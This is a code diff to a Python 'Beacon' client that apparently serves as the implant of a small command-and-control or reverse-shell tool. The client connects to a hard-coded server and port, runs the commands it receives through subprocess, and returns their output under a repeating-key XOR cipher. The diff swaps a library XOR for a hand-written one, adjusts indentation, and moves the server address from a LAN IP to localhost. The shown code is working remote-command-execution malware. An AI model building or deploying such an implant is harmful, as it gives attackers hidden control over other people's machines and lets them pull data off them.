@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 
 import socket,subprocess,time,random,platform
-from Crypto.Util.strxor import strxor
 
 class Beacon:
    #Contains client side behavior and state
@@ -38,8 +37,8 @@ class Beacon:
                  self.sock.send(self.encrypt(chunk))
                self.sock.send(self.encrypt("END".encode()))
             else:
-                 self.sock.send(self.encrypt(ps.stdout))
-                 self.sock.send(self.encrypt("END".encode()))
+               self.sock.send(self.encrypt(ps.stdout))
+               self.sock.send(self.encrypt("END".encode()))
          else:
             self.sock.send(self.encrypt("SUCCESS".encode()))
             self.sock.send(self.encrypt("END".encode()))
@@ -96,13 +95,16 @@ class Beacon:
          self.sock.shutdown(socket.SHUT_RDWR)
          self.sock.close()
    
-   def encrypt(self,data):
-      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
-      return strxor(data,key.encode())
+   def xor(self, data, key):
+      return bytes([a ^ b for a, b in zip(data, key)])
 
-   def decrypt(self,data):
+   def encrypt(self, data):
       key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
-      return strxor(data,key.encode())
+      return self.xor(data, key.encode())
+
+   def decrypt(self, data):
+      key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
+      return self.xor(data, key.encode())
    
    def detect_local_ip(self):
       if platform.system() == "Windows":
@@ -115,7 +117,7 @@ class Beacon:
          return "Unsupported OS"
 
 def main():
-   beacon = Beacon("192.168.13.134",10267)
+   beacon = Beacon("127.0.0.1",10267)
    beacon.start()
 
 if __name__ == "__main__":
